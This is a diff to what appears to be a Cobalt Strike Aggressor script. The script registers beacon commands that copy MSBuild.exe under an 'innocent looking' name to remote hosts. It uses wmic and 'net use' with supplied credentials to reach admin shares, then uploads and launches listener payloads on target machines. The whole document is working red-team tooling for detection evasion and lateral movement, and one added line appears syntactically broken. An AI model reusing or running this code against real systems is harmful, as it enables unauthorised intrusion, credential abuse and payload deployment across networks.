@@ -43,7 +43,7 @@ beacon_command_register("check_msbuild",
 
 beacon_command_register("rename_msbuild", 
 		"Create innocent looking copy of MSBuild.exe",
-		"Synopsis: rename_msbuild -target TARGET -msbuild [newname] [-path C:\new\path] [-user username] [-pass password]", 
+		"Synopsis: rename_msbuild -target TARGET -msbuild [newname] [-path C:\\new\\path] [-user username] [-pass password]", 
 		"This copies MSBuild.exe to C:\\Users\\Public by default.");
 
 beacon_command_register("wmi_msbuild", 
@@ -148,10 +148,10 @@ sub hide {
 	## 6 	opt: pass
 
 	if ( $5 && $6 ) {
-		bshell($1, "wmic /node:" . $2 . " /user:'" . $5 . "' /password:'" . $6 . "' process call create \"cmd /c copy /y C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe " . $4 . $3 . "\"");
+		bshell($1, "wmic /node:" . $2 . " /user:'" . $5 . "' /password:'" . $6 . "' process call create \"cmd /c copy /y C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe " . strrep($4, "$", ":") . $3 . "\"");
 	}
 	else {
-		bcp($1, '\\\\' . $2 . '\\C$\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe', '\'\\\\' . $2 . '\\' . $4 . $3 .'\'');
+		bcp($1, '\\\\' . $2 . '\\C$\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe', '\'\\\\' . $2 . '\\' . strrep($4, ":", "$") . $3 .'\'');
 	}
 
 	
@@ -192,8 +192,8 @@ sub msbuild {
 	############
 	#Ensure listener exists
 	if (%args['listener'] !in listeners_local()) {
-    	berror($1, "Listener " . %args['listener'] . " does not exist");
-    	return;
+    		berror($1, "Listener " . %args['listener'] . " does not exist");
+    		return;
    	}
 
 	###############
@@ -251,7 +251,18 @@ sub msbuild {
 	}
 
 	#upload
-	bupload_raw($1,'\\\\'. %args['target'] . '\\' . strrep($pay_dir, ":", "$") . $filename , $payload);
+	$unc = '\\\\'. %args['target'] . '\\' . strrep($pay_dir, ":", "$");
+	
+	if("user" in %args && "pass" in %args) {
+		bshell($1, 'net use \\\\'. %args['target'] . '\\C$ /user:' . %args['user'] . ' ' . %args['pass']);
+		sleep(5000);
+		bupload_raw($1, $unc . $filename , $payload);
+		sleep(2000);
+		bshell($1, 'net use \\\\'. %args['target'] . '\\C$ /delete' /y);
+	}
+	else {
+		bupload_raw($1, $unc . $filename , $payload);
+	}
 
 	##########
 	# Launch #
